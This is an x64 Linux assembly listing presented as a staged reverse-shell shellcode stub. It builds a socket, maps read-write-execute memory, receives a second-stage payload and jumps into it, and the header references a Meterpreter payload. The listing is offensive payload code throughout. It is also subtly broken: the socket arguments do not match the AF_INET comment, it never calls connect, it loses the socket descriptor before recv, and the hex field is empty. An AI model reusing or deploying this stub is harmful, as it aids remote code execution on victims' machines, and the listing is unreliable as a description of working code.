; Title:    Linux x64 staged reverse shell (recv+exec)
; Platform: linux
; Arch:     x64
; Size:     ~100 bytes
; Encoding: raw
;
; Hex:
; ; generate with msfvenom -p linux/x64/meterpreter/reverse_tcp

BITS 64
global _start

_start:
    ; Stage 0: connect + recv stage 1 shellcode into rwx memory + exec
    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    xor     edi, edi
    mul     edi
    inc     edi
    push    0x2
    pop     rax
    push    0x29
    pop     rax
    xor     esi, esi
    inc     esi
    xor     edx, edx
    syscall
    push    rax
    pop     rdi
    ; mmap(0, 4096, PROT_READ|WRITE|EXEC, MAP_PRIVATE|MAP_ANON, -1, 0)
    push    0x9
    pop     rax
    xor     edi, edi
    push    0x1000
    pop     rsi
    push    0x7
    pop     rdx
    push    0x22
    pop     r10
    xor     r8d, r8d
    dec     r8
    xor     r9d, r9d
    syscall
    push    rax
    pop     rbx
    ; recv(sockfd, rxbuf, 4096, 0)
    push    rdi
    pop     rdi
    mov     rsi, rbx
    push    0x1000
    pop     rdx
    xor     r10d, r10d
    push    0x2d
    pop     rax
    syscall
    ; jmp to received shellcode
    jmp     rbx
